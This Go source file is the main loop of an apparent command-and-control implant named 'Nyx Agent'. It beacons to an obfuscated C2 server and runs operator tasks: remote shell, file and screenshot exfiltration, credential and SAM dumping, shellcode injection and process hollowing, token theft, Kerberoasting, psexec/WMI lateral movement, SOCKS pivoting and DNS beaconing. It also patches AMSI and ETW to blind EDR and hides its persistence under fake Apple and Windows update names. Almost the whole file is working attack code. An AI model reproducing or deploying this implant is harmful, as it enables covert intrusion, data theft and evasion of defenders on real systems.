package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

// Overridden at build time via -ldflags
var C2URL         = "http://127.0.0.1:8000"
var DefaultSleep  = "5"
var DefaultJitter = "1"
var XORKey        = ""   // enables XOR obfuscation of C2URL
var JitterMode    = "linear" // linear | gaussian | sinusoidal | burst
var KillDate      = ""   // "YYYY-MM-DD" — agent self-destructs after this date

var burstCounter int
var currentAgentID string // set after first successful checkin

func init() {
	if XORKey != "" {
		C2URL = xorDecodeHex(C2URL, XORKey)
	}
}

// checkKillDate exits if the compiled kill date has passed.
func checkKillDate() {
	if KillDate == "" {
		return
	}
	t, err := time.Parse("2006-01-02", KillDate)
	if err != nil {
		return
	}
	if time.Now().After(t) {
		fmt.Printf("[!] Kill date %s reached — self-terminating.\n", KillDate)
		os.Exit(0)
	}
}

// sleepWithJitter waits according to the selected jitter mode.
func sleepWithJitter(baseSeconds, jitterSeconds int) {
	var dur float64
	base := float64(baseSeconds)
	jit := float64(jitterSeconds)

	switch JitterMode {
	case "gaussian":
		// Box-Muller transform → normal distribution
		u1 := rand.Float64() + 1e-9
		u2 := rand.Float64()
		z := math.Sqrt(-2*math.Log(u1)) * math.Cos(2*math.Pi*u2)
		dur = base + z*jit
	case "sinusoidal":
		// Slow sinusoidal wave — period ≈ 10× sleep interval
		t := float64(time.Now().Unix())
		wave := math.Sin(t / (base * 5))
		dur = base + wave*jit
	case "burst":
		// 3 fast beacons then 1 long pause (avoids uniform interval detection)
		burstCounter++
		if burstCounter%4 == 0 {
			dur = base * 3
		} else {
			dur = base/3 + 1
		}
	default: // "linear"
		jitter := rand.Intn(jitterSeconds*2+1) - jitterSeconds
		dur = float64(baseSeconds + jitter)
	}

	if dur < 1 {
		dur = 1
	}
	time.Sleep(time.Duration(dur * float64(time.Second)))
}

func xorDecodeHex(hexStr, key string) string {
	if len(hexStr)%2 != 0 {
		return hexStr
	}
	b := make([]byte, len(hexStr)/2)
	for i := 0; i < len(b); i++ {
		var val byte
		fmt.Sscanf(hexStr[i*2:i*2+2], "%02x", &val)
		b[i] = val ^ key[i%len(key)]
	}
	return string(b)
}

type CheckinRequest struct {
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	IP       string `json:"ip"`
	PubKey   string `json:"pub_key,omitempty"` // ECDH P-256 public key (hex)
}

type Task struct {
	ID      string `json:"id"`
	Command string `json:"command"`
}

type CheckinResponse struct {
	AgentID   string `json:"agent_id"`
	Sleep     string `json:"sleep"`
	Jitter    string `json:"jitter"`
	Task      *Task  `json:"task"`
	ServerPub string `json:"server_pub,omitempty"` // ECDH server public key (hex)
}

type TaskResult struct {
	TaskID string `json:"task_id"`
	Output string `json:"output"`
	Status string `json:"status"`
}

var client = &http.Client{
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	},
	Timeout: 30 * time.Second,
}

func getOutboundIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "unknown"
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return "unknown"
}

func checkin(agentID string) (*CheckinResponse, error) {
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}

	payload := CheckinRequest{
		Hostname: hostname,
		Username: username,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		IP:       getOutboundIP(),
	}

	// Include ECDH pub key on first checkin (before key exchange completes)
	if !ecdhDone && ecdhPubHex != "" {
		payload.PubKey = ecdhPubHex
	}

	data, _ := json.Marshal(payload)

	// Append agent ID as query param once we have it (so server can look up session key)
	uri := C2URL + profileURI(ProfileCheckin, agentID)
	if agentID != "" {
		uri += "?id=" + agentID
	}

	// Use encryption if key exchange is already done
	var resp *http.Response
	var err error
	if ecdhDone || aesGCM != nil {
		resp, err = encPost(uri, ProfileContentType, data)
	} else {
		resp, err = profileDo("POST", uri, bytes.NewBuffer(data))
	}
	if err != nil {
		return nil, err
	}

	body, err := readDecrypted(resp)
	if err != nil {
		return nil, err
	}

	var result CheckinResponse
	json.Unmarshal(body, &result)
	return &result, nil
}

func executeShell(command string) (string, error) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("/bin/sh", "-c", command)
	}
	var out, stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()
	output := out.String() + stderr.String()
	if output == "" && err != nil {
		output = err.Error()
	}
	return output, err
}

func handleTask(agentID string, task *Task) {
	fmt.Printf("[*] Task: %s\n", task.Command)

	output, status := dispatch(task.Command)

	result := TaskResult{TaskID: task.ID, Output: output, Status: status}
	data, _ := json.Marshal(result)
	url := C2URL + profileURI(ProfileResult, agentID)
	resp, err := encPost(url, ProfileContentType, data)
	if err != nil {
		fmt.Printf("[-] Failed to send result: %v\n", err)
		return
	}
	defer resp.Body.Close()
	fmt.Printf("[+] Task %s → %s\n", task.ID[:8], status)
}

func dispatch(command string) (string, string) {
	parts := strings.SplitN(strings.TrimSpace(command), " ", 2)
	cmd := strings.ToLower(parts[0])
	arg := ""
	if len(parts) > 1 {
		arg = parts[1]
	}

	switch cmd {

	case "shell":
		if arg == "" {
			return "usage: shell <command>", "failed"
		}
		out, err := executeShell(arg)
		if err != nil {
			return out, "failed"
		}
		return out, "completed"

	case "sysinfo":
		hostname, _ := os.Hostname()
		user := os.Getenv("USER")
		if user == "" {
			user = os.Getenv("USERNAME")
		}
		return fmt.Sprintf(
			"Hostname : %s\nUser     : %s\nOS       : %s\nArch     : %s\nPID      : %d\nIP       : %s",
			hostname, user, runtime.GOOS, runtime.GOARCH, os.Getpid(), getOutboundIP(),
		), "completed"

	case "whoami":
		out, _ := executeShell("whoami")
		return strings.TrimSpace(out), "completed"

	case "pwd":
		dir, _ := os.Getwd()
		return dir, "completed"

	case "cd":
		if arg == "" {
			return "usage: cd <path>", "failed"
		}
		if err := os.Chdir(arg); err != nil {
			return err.Error(), "failed"
		}
		dir, _ := os.Getwd()
		return "Changed to: " + dir, "completed"

	case "ls":
		path := "."
		if arg != "" {
			path = arg
		}
		entries, err := os.ReadDir(path)
		if err != nil {
			return err.Error(), "failed"
		}
		var lines []string
		for _, e := range entries {
			info, _ := e.Info()
			if e.IsDir() {
				lines = append(lines, fmt.Sprintf("drwxr-xr-x  %s/", e.Name()))
			} else {
				lines = append(lines, fmt.Sprintf("-rw-r--r--  %-8d  %s", info.Size(), e.Name()))
			}
		}
		if len(lines) == 0 {
			return "(empty directory)", "completed"
		}
		return strings.Join(lines, "\n"), "completed"

	case "cat":
		if arg == "" {
			return "usage: cat <file>", "failed"
		}
		data, err := os.ReadFile(arg)
		if err != nil {
			return err.Error(), "failed"
		}
		return string(data), "completed"

	case "ps":
		var out string
		var err error
		if runtime.GOOS == "windows" {
			out, err = executeShell("tasklist /FO TABLE")
		} else {
			out, err = executeShell("ps aux")
		}
		if err != nil {
			return out, "failed"
		}
		return out, "completed"

	case "env":
		return strings.Join(os.Environ(), "\n"), "completed"

	case "download":
		if arg == "" {
			return "usage: download <remote_path>", "failed"
		}
		data, err := os.ReadFile(arg)
		if err != nil {
			return err.Error(), "failed"
		}
		encoded := base64.StdEncoding.EncodeToString(data)
		filename := filepath.Base(arg)
		return fmt.Sprintf("FILE:%s:BASE64:%s", filename, encoded), "completed"

	case "upload":
		// format: upload <dest_path> <base64data>
		uploadParts := strings.SplitN(arg, " ", 2)
		if len(uploadParts) < 2 {
			return "usage: upload <dest_path> <base64data>", "failed"
		}
		dest := uploadParts[0]
		decoded, err := base64.StdEncoding.DecodeString(uploadParts[1])
		if err != nil {
			return "base64 decode error: " + err.Error(), "failed"
		}
		if err := os.WriteFile(dest, decoded, 0644); err != nil {
			return err.Error(), "failed"
		}
		return fmt.Sprintf("Uploaded %d bytes to %s", len(decoded), dest), "completed"

	case "persist":
		return installPersistence(), "completed"

	case "unpersist":
		return removePersistence(), "completed"

	case "sleep":
		if arg == "" {
			return "usage: sleep <seconds>", "failed"
		}
		return fmt.Sprintf("Sleep interval acknowledged: %ss", arg), "completed"

	case "screenshot":
		return takeScreenshot()

	case "netstat":
		var out string
		var err error
		if runtime.GOOS == "windows" {
			out, err = executeShell("netstat -ano")
		} else {
			out, err = executeShell("netstat -tuln 2>/dev/null || ss -tuln")
		}
		if err != nil {
			return out, "failed"
		}
		return out, "completed"

	case "ifconfig", "ipconfig":
		var out string
		var err error
		if runtime.GOOS == "windows" {
			out, err = executeShell("ipconfig /all")
		} else {
			out, err = executeShell("ifconfig 2>/dev/null || ip addr")
		}
		if err != nil {
			return out, "failed"
		}
		return out, "completed"

	case "ssh-exec":
		// usage: ssh-exec <host:port> <user> <pass> <command>
		sshParts := strings.SplitN(arg, " ", 4)
		if len(sshParts) < 4 {
			return "usage: ssh-exec <host:port> <user> <pass> <command>", "failed"
		}
		return sshExec(sshParts[0], sshParts[1], sshParts[2], sshParts[3])

	case "ssh-key-exec":
		// usage: ssh-key-exec <host:port> <user> <privkey_pem_b64> <command>
		sshParts := strings.SplitN(arg, " ", 4)
		if len(sshParts) < 4 {
			return "usage: ssh-key-exec <host:port> <user> <privkey_pem_b64> <command>", "failed"
		}
		keyPEM, err := base64.StdEncoding.DecodeString(sshParts[2])
		if err != nil {
			return "base64 decode of key failed: " + err.Error(), "failed"
		}
		return sshKeyExec(sshParts[0], sshParts[1], string(keyPEM), sshParts[3])

	case "portscan":
		scanParts := strings.SplitN(arg, " ", 2)
		host := ""
		ports := ""
		if len(scanParts) >= 1 {
			host = scanParts[0]
		}
		if len(scanParts) >= 2 {
			ports = scanParts[1]
		}
		return portScan(host, ports)

	case "hostscan":
		return hostDiscover(strings.TrimSpace(arg))

	case "creds":
		return harvestCreds()

	case "privesc":
		return privescCheck()

	case "arp":
		var out string
		var err error
		if runtime.GOOS == "windows" {
			out, err = executeShell("arp -a")
		} else {
			out, err = executeShell("arp -a 2>/dev/null || ip neigh show")
		}
		if err != nil {
			return out, "failed"
		}
		return out, "completed"

	case "shellcode":
		if arg == "" {
			return "usage: shellcode <base64_shellcode>", "failed"
		}
		return shellcodeRun(arg)

	case "smb-exec":
		// usage: smb-exec <host> <user> <pass> <local_exe_path> [remote_path]
		p := strings.SplitN(arg, " ", 5)
		if len(p) < 4 {
			return "usage: smb-exec <host> <user> <pass> <local_exe> [remote_path]", "failed"
		}
		remote := ""
		if len(p) == 5 {
			remote = p[4]
		}
		return smbExec(p[0], p[1], p[2], p[3], remote)

	case "wmi-exec":
		// usage: wmi-exec <host> <user> <pass> <command>
		p := strings.SplitN(arg, " ", 4)
		if len(p) < 4 {
			return "usage: wmi-exec <host> <user> <pass> <command>", "failed"
		}
		return wmiExec(p[0], p[1], p[2], p[3])

	case "psexec":
		// usage: psexec <host> <user> <pass> <command>
		p := strings.SplitN(arg, " ", 4)
		if len(p) < 4 {
			return "usage: psexec <host> <user> <pass> <command>", "failed"
		}
		return psExec(p[0], p[1], p[2], p[3])

	case "dump-sam":
		return dumpSAM()

	case "inject":
		// usage: inject <pid> <shellcode_base64>
		injParts := strings.SplitN(arg, " ", 2)
		if len(injParts) < 2 {
			return "usage: inject <pid> <shellcode_base64>", "failed"
		}
		pid, err := strconv.Atoi(injParts[0])
		if err != nil {
			return "invalid PID: " + injParts[0], "failed"
		}
		sc, err := base64.StdEncoding.DecodeString(injParts[1])
		if err != nil {
			return "base64 decode error: " + err.Error(), "failed"
		}
		return injectShellcode(pid, sc)

	case "migrate":
		// usage: migrate <pid>  — inject a copy of ourselves into another process
		if arg == "" {
			return "usage: migrate <pid>", "failed"
		}
		pid, err := strconv.Atoi(strings.TrimSpace(arg))
		if err != nil {
			return "invalid PID: " + arg, "failed"
		}
		// Read own binary and inject it
		exePath, _ := os.Executable()
		binary, err := os.ReadFile(exePath)
		if err != nil {
			return "failed to read self: " + err.Error(), "failed"
		}
		return injectShellcode(pid, binary)

	case "evasion":
		switch strings.TrimSpace(arg) {
		case "status":
			return evasionStatus(), "completed"
		case "amsi":
			if err := patchAmsi(); err != nil {
				return "AMSI patch failed: " + err.Error(), "failed"
			}
			return "[+] AmsiScanBuffer patched — AMSI bypassed", "completed"
		case "etw":
			if err := patchEtw(); err != nil {
				return "ETW patch failed: " + err.Error(), "failed"
			}
			return "[+] EtwEventWrite patched — EDR telemetry blinded", "completed"
		default:
			sub := strings.SplitN(strings.TrimSpace(arg), " ", 2)
			if len(sub) == 2 && sub[0] == "ppid" {
				out, err := spawnWithSpoofedPpid(PpidTarget, sub[1])
				if err != nil {
					return "PPID spoof failed: " + err.Error(), "failed"
				}
				return out, "completed"
			}
			return "usage: evasion [status|amsi|etw|ppid <cmd>]", "failed"
		}

	// ── Phase 3: Advanced Post-Exploitation ────────────────────────────────

	case "hollow":
		// usage: hollow <target_exe> <shellcode_base64>
		p := strings.SplitN(arg, " ", 2)
		if len(p) < 2 {
			return "usage: hollow <target_exe> <shellcode_base64>", "failed"
		}
		sc, err := base64.StdEncoding.DecodeString(p[1])
		if err != nil {
			return "base64 decode: " + err.Error(), "failed"
		}
		out, err := hollowProcess(p[0], sc)
		if err != nil {
			return err.Error(), "failed"
		}
		return out, "completed"

	case "hollow-pe":
		// usage: hollow-pe <target_exe> <pe_base64>
		p := strings.SplitN(arg, " ", 2)
		if len(p) < 2 {
			return "usage: hollow-pe <target_exe> <pe_base64>", "failed"
		}
		pe, err := base64.StdEncoding.DecodeString(p[1])
		if err != nil {
			return "base64 decode: " + err.Error(), "failed"
		}
		out, err := hollowPE(p[0], pe)
		if err != nil {
			return err.Error(), "failed"
		}
		return out, "completed"

	case "token-list":
		return listTokens(), "completed"

	case "token-steal":
		// usage: token-steal <pid>
		if arg == "" {
			return "usage: token-steal <pid>", "failed"
		}
		pid, err := strconv.ParseUint(strings.TrimSpace(arg), 10, 32)
		if err != nil {
			return "invalid PID: " + arg, "failed"
		}
		out, err := impersonateProcess(uint32(pid))
		if err != nil {
			return err.Error(), "failed"
		}
		return out, "completed"

	case "token-make":
		// usage: token-make <domain> <user> <pass>
		p := strings.SplitN(arg, " ", 3)
		if len(p) < 3 {
			return "usage: token-make <domain> <user> <pass>", "failed"
		}
		out, err := makeToken(p[0], p[1], p[2])
		if err != nil {
			return err.Error(), "failed"
		}
		return out, "completed"

	case "token-revert":
		return revertToken(), "completed"

	case "token-spawn":
		// usage: token-spawn <cmd>
		if arg == "" {
			return "usage: token-spawn <cmd>", "failed"
		}
		out, err := spawnAsCurrentToken(arg)
		if err != nil {
			return err.Error(), "failed"
		}
		return out, "completed"

	case "bof":
		// usage: bof <coff_base64> [args_base64]
		p := strings.SplitN(arg, " ", 2)
		if len(p) < 1 || p[0] == "" {
			return "usage: bof <coff_base64> [args_base64]", "failed"
		}
		coff, err := base64.StdEncoding.DecodeString(p[0])
		if err != nil {
			return "coff base64 decode: " + err.Error(), "failed"
		}
		var args []byte
		if len(p) == 2 && p[1] != "" {
			args, err = base64.StdEncoding.DecodeString(p[1])
			if err != nil {
				return "args base64 decode: " + err.Error(), "failed"
			}
		}
		out, err := loadBOF(coff, args)
		if err != nil {
			return err.Error(), "failed"
		}
		return out, "completed"

	case "refdll":
		// usage: refdll <dll_base64>
		if arg == "" {
			return "usage: refdll <dll_base64>", "failed"
		}
		dll, err := base64.StdEncoding.DecodeString(arg)
		if err != nil {
			return "base64 decode: " + err.Error(), "failed"
		}
		out, err := reflectiveDLLLoad(dll)
		if err != nil {
			return err.Error(), "failed"
		}
		return out, "completed"

	case "kerb-list":
		out, err := kerbList()
		if err != nil {
			return err.Error(), "failed"
		}
		return out, "completed"

	case "kerb-roast":
		// usage: kerb-roast <SPN>  e.g. HTTP/sqlsvc.corp.local
		if arg == "" {
			return "usage: kerb-roast <SPN>", "failed"
		}
		out, err := kerbRoast(strings.TrimSpace(arg))
		if err != nil {
			return err.Error(), "failed"
		}
		return out, "completed"

	case "asrep-roast":
		// usage: asrep-roast <user> <domain> <dc_ip>
		p := strings.SplitN(arg, " ", 3)
		if len(p) < 3 {
			return "usage: asrep-roast <user> <domain> <dc_ip>", "failed"
		}
		out, err := asRepRoast(p[0], p[1], p[2])
		if err != nil {
			return err.Error(), "failed"
		}
		return out, "completed"

	// ── Phase 4: P2P & Pivot ────────────────────────────────────────────────

	case "socks5-start":
		// usage: socks5-start <port> [user pass]
		p := strings.SplitN(arg, " ", 3)
		if len(p) < 1 || p[0] == "" {
			return "usage: socks5-start <port> [user pass]", "failed"
		}
		port, err := strconv.Atoi(p[0])
		if err != nil {
			return "invalid port: " + p[0], "failed"
		}
		user, pass := "", ""
		if len(p) == 3 {
			user = p[1]
			pass = p[2]
		}
		out, err := startSOCKS5(port, user, pass)
		if err != nil {
			return err.Error(), "failed"
		}
		return out, "completed"

	case "socks5-stop":
		return stopSOCKS5(), "completed"

	case "socks5-status":
		return socks5Status(), "completed"

	case "pfwd-start":
		// usage: pfwd-start <local_port> <remote_host:port>
		p := strings.SplitN(arg, " ", 2)
		if len(p) < 2 {
			return "usage: pfwd-start <local_port> <remote_addr>", "failed"
		}
		lport, err := strconv.Atoi(p[0])
		if err != nil {
			return "invalid port: " + p[0], "failed"
		}
		out, err := startPortForward(lport, p[1])
		if err != nil {
			return err.Error(), "failed"
		}
		return out, "completed"

	case "pfwd-stop":
		// usage: pfwd-stop <local_port>
		if arg == "" {
			return "usage: pfwd-stop <local_port>", "failed"
		}
		lport, err := strconv.Atoi(strings.TrimSpace(arg))
		if err != nil {
			return "invalid port: " + arg, "failed"
		}
		return stopPortForward(lport), "completed"

	case "smb-pipe-listen":
		// usage: smb-pipe-listen <pipe_name>
		if arg == "" {
			return "usage: smb-pipe-listen <pipe_name>", "failed"
		}
		out, err := startPipeServer(strings.TrimSpace(arg))
		if err != nil {
			return err.Error(), "failed"
		}
		return out, "completed"

	case "smb-pipe-stop":
		return stopPipeServer(), "completed"

	case "smb-pipe-status":
		return smbPipeStatus(), "completed"

	case "smb-pipe-connect":
		// usage: smb-pipe-connect <host> <pipe_name>
		p := strings.SplitN(arg, " ", 2)
		if len(p) < 2 {
			return "usage: smb-pipe-connect <host> <pipe_name>", "failed"
		}
		out, err := connectToPipeServer(p[0], p[1])
		if err != nil {
			return err.Error(), "failed"
		}
		return out, "completed"

	case "dns-beacon-start":
		// usage: dns-beacon-start <domain> [resolver_ip:port]
		p := strings.SplitN(arg, " ", 2)
		if len(p) < 1 || p[0] == "" {
			return "usage: dns-beacon-start <domain> [resolver]", "failed"
		}
		resolver := ""
		if len(p) == 2 {
			resolver = p[1]
		}
		out, err := startDNSBeacon(p[0], resolver, currentAgentID)
		if err != nil {
			return err.Error(), "failed"
		}
		return out, "completed"

	case "dns-beacon-stop":
		return stopDNSBeacon(), "completed"

	case "dns-beacon-status":
		return dnsBeaconStatus(), "completed"

	case "kill":
		fmt.Println("[!] Kill command received, exiting.")
		os.Exit(0)
		return "", "completed"

	default:
		// try to run as shell command
		out, err := executeShell(command)
		if err != nil {
			return out, "failed"
		}
		return out, "completed"
	}
}

func takeScreenshot() (string, string) {
	tmpFile := fmt.Sprintf("/tmp/nyx_screen_%d.png", time.Now().Unix())
	var err error

	switch runtime.GOOS {
	case "darwin":
		_, err = executeShell(fmt.Sprintf("screencapture -x %s", tmpFile))
	case "linux":
		_, err = executeShell(fmt.Sprintf("import -window root %s 2>/dev/null || scrot %s 2>/dev/null || gnome-screenshot -f %s", tmpFile, tmpFile, tmpFile))
	case "windows":
		ps := fmt.Sprintf(`Add-Type -AssemblyName System.Windows.Forms; $s=[System.Windows.Forms.Screen]::PrimaryScreen; $b=New-Object System.Drawing.Bitmap($s.Bounds.Width,$s.Bounds.Height); $g=[System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen($s.Bounds.Location,[System.Drawing.Point]::Empty,$s.Bounds.Size); $b.Save('%s')`, tmpFile)
		_, err = executeShell(fmt.Sprintf("powershell -Command \"%s\"", ps))
	default:
		return "Unsupported OS: " + runtime.GOOS, "failed"
	}

	if err != nil {
		return "Screenshot failed: " + err.Error(), "failed"
	}

	data, readErr := os.ReadFile(tmpFile)
	os.Remove(tmpFile)
	if readErr != nil {
		return "Could not read screenshot: " + readErr.Error(), "failed"
	}

	encoded := base64.StdEncoding.EncodeToString(data)
	return fmt.Sprintf("SCREENSHOT:BASE64:%s", encoded), "completed"
}

func installPersistence() string {
	exePath, err := os.Executable()
	if err != nil {
		return "Failed to get executable path: " + err.Error()
	}
	exePath, _ = filepath.Abs(exePath)

	switch runtime.GOOS {
	case "darwin":
		plist := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.update.helper</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>`, exePath)

		plistPath := os.Getenv("HOME") + "/Library/LaunchAgents/com.apple.update.helper.plist"
		if err := os.WriteFile(plistPath, []byte(plist), 0644); err != nil {
			return "Failed to write plist: " + err.Error()
		}
		exec.Command("launchctl", "load", plistPath).Run()
		return fmt.Sprintf("[+] Persistence installed via LaunchAgent: %s", plistPath)

	case "linux":
		cronLine := fmt.Sprintf("@reboot %s\n", exePath)
		tmpFile := "/tmp/.cron_nyx"
		exec.Command("/bin/sh", "-c", "crontab -l 2>/dev/null > "+tmpFile).Run()

		existing, _ := os.ReadFile(tmpFile)
		if !strings.Contains(string(existing), exePath) {
			f, err := os.OpenFile(tmpFile, os.O_APPEND|os.O_WRONLY, 0644)
			if err != nil {
				return "Failed to open cron file: " + err.Error()
			}
			f.WriteString(cronLine)
			f.Close()
			exec.Command("crontab", tmpFile).Run()
		}
		os.Remove(tmpFile)
		return fmt.Sprintf("[+] Persistence installed via crontab @reboot: %s", exePath)

	case "windows":
		key := `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
		out, err := executeShell(fmt.Sprintf(`reg add "%s" /v "WindowsUpdate" /t REG_SZ /d "%s" /f`, key, exePath))
		if err != nil {
			return "Registry error: " + out
		}
		return fmt.Sprintf("[+] Persistence installed via Registry Run key: %s", exePath)

	default:
		return "Unsupported OS: " + runtime.GOOS
	}
}

func removePersistence() string {
	switch runtime.GOOS {
	case "darwin":
		plistPath := os.Getenv("HOME") + "/Library/LaunchAgents/com.apple.update.helper.plist"
		exec.Command("launchctl", "unload", plistPath).Run()
		os.Remove(plistPath)
		return "[+] LaunchAgent persistence removed"

	case "linux":
		exePath, _ := os.Executable()
		exePath, _ = filepath.Abs(exePath)
		tmpFile := "/tmp/.cron_nyx"
		exec.Command("/bin/sh", "-c", "crontab -l 2>/dev/null > "+tmpFile).Run()
		data, _ := os.ReadFile(tmpFile)
		var newLines []string
		for _, line := range strings.Split(string(data), "\n") {
			if !strings.Contains(line, exePath) {
				newLines = append(newLines, line)
			}
		}
		os.WriteFile(tmpFile, []byte(strings.Join(newLines, "\n")), 0644)
		exec.Command("crontab", tmpFile).Run()
		os.Remove(tmpFile)
		return "[+] Crontab persistence removed"

	case "windows":
		key := `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
		out, err := executeShell(fmt.Sprintf(`reg delete "%s" /v "WindowsUpdate" /f`, key))
		if err != nil {
			return "Registry error: " + out
		}
		return "[+] Registry Run key persistence removed"

	default:
		return "Unsupported OS: " + runtime.GOOS
	}
}

func main() {
	fmt.Println("[*] Nyx Agent v0.9.0 starting...")

	// Kill date check
	checkKillDate()

	// Static AES key (legacy / fallback)
	if err := initCrypto(); err != nil {
		fmt.Printf("[!] Crypto init warning: %v\n", err)
	} else if EncKey != "" {
		fmt.Println("[+] Static AES-256-GCM key active (legacy mode)")
	}

	// ECDH ephemeral key generation
	if err := initECDH(); err != nil {
		fmt.Printf("[!] ECDH init warning: %v\n", err)
	} else {
		fmt.Printf("[+] ECDH keypair ready (profile: %s, jitter: %s)\n", ProfileName, JitterMode)
	}

	// EDR evasion (Windows-only; no-ops on Linux/macOS)
	initSleepMask()
	if result := initEvasion(); result != "" && result != "evasion: Windows-only" {
		fmt.Println("[+] Evasion:", result)
	}

	var agentID string
	var dohStarted bool
	sleepSeconds := 5
	jitterSeconds := 1

	if s, err := strconv.Atoi(DefaultSleep); err == nil {
		sleepSeconds = s
	}
	if j, err := strconv.Atoi(DefaultJitter); err == nil {
		jitterSeconds = j
	}

	for {
		checkKillDate()

		resp, err := checkin(agentID)
		if err != nil {
			fmt.Printf("[-] Checkin failed: %v — retrying in %ds\n", err, sleepSeconds)
			time.Sleep(time.Duration(sleepSeconds) * time.Second)
			continue
		}

		agentID = resp.AgentID
		currentAgentID = agentID

		// Complete ECDH key exchange on first checkin that returns server_pub
		if resp.ServerPub != "" && !ecdhDone {
			if err := deriveSessionKey(resp.ServerPub); err != nil {
				fmt.Printf("[!] ECDH key derivation failed: %v\n", err)
			}
		}

		if !dohStarted && DohVar != "" && C2Domain != "" {
			dohStarted = true
			go runDohBeacon(agentID)
		}

		if s, err := strconv.Atoi(resp.Sleep); err == nil {
			sleepSeconds = s
		}
		if j, err := strconv.Atoi(resp.Jitter); err == nil {
			jitterSeconds = j
		}

		if resp.Task != nil {
			go handleTask(agentID, resp.Task)
		}

		maskSensitiveData()
		sleepWithJitter(sleepSeconds, jitterSeconds)
		unmaskSensitiveData()
	}
}
